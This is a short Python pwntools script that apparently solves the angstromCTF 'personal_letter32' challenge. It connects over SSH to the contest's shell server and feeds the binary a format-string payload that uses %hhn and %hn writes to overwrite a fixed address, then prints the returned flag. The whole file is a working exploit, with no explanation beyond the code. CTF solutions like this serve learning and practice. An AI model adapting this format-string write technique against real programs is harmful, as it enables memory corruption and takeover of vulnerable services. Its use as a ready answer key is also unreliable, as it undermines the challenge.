#!/usr/bin/env python2
from pwn import *
import binascii
file_path = "./personal_letter32"
context.log_level = 'critical'

team_id = 'secret'
password = 'secret'

shell = ssh(team_id, 'shell.angstromctf.com', password=password)

addr_to_overwrite = 0x0804A030

payload = "AAAA"
payload += p32(addr_to_overwrite + 2)
payload += p32(addr_to_overwrite)
payload += p32(addr_to_overwrite + 1)
payload += "%19x"
payload += "%28$hhn"
payload += "%92x"
payload += "%29$hhn"
payload += "%2000x"
payload += "%27$hn"
payload = payload.ljust(50, "A")

enc = binascii.hexlify(payload)
cmd = "cd /problems/letter/ && python -c \"import binascii;import sys;sys.stdout.write(binascii.unhexlify('{}'))\" | ./personal_letter32".format(enc)
proc = shell.run(cmd)
res = proc.recvall()
print res[res.find("actf")::]
